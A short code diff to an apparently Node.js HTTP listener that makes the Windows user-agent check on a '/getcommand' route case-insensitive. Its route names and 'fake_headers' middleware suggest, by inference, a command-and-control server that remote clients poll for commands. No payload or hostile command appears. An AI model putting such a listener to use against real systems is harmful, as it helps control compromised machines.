@@ -277,11 +277,13 @@ async function http_listener() {
 	}));
 	lis.use(bodyParser.json());
 	lis.use(cookieParser());
+	
+	
 	lis.get(/\/getcommand.*/,funs.fake_headers, (req, res) => {
 		// check if socket is already connected
 		let os = "linux"
 		let os_path = "/assets/linux.png"
-		if(req.headers['user-agent'].includes("Windows")){
+		if(req.headers['user-agent'].toLocaleLowerCase().includes("windows")){
 			os = "windows"
 			os_path = "/assets/windows.png"
 		}
